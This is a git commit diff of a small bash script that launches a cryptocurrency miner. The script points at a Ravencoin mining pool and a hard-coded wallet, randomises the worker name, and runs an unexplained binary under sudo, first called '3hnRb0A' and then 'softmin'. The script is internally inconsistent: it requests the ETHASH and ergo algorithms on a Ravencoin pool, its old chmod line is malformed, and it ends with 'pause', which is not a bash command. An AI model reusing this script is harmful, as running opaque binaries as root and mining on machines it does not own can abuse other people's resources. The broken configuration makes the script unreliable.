51f66d019aa8afebb0eeac733c269fb2dbe9d187
lambohopo <86089421+lambohopo@users.noreply.github.com>
2021-07-06 19:55:33 +0700

    Update 2m.sh

--- 2m.sh
+++ 2m.sh
@@ -1,7 +1,10 @@
 #!/bin/bash
+
 POOL=asia-rvn.2miners.com:6060
 WALLET=RXNiSymsyLLVqMAyY3u8NiZZMRWcGg1Anr
-WORKEER=$(echo $(shuf -i 10000-99999999999 -n 1)-LGK)
+WORKER=$(echo $(shuf -i 1-100 -n 1)-GPU)
 
-chmod  x 3hnRb0A
-./3hnRb0A --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
+cd "$(dirname "$0")"
+
+chmod +x ./softmin && sudo ./softmin -a ergo -o $POOL -u $WALLET.$WORKER -log
+pause $@
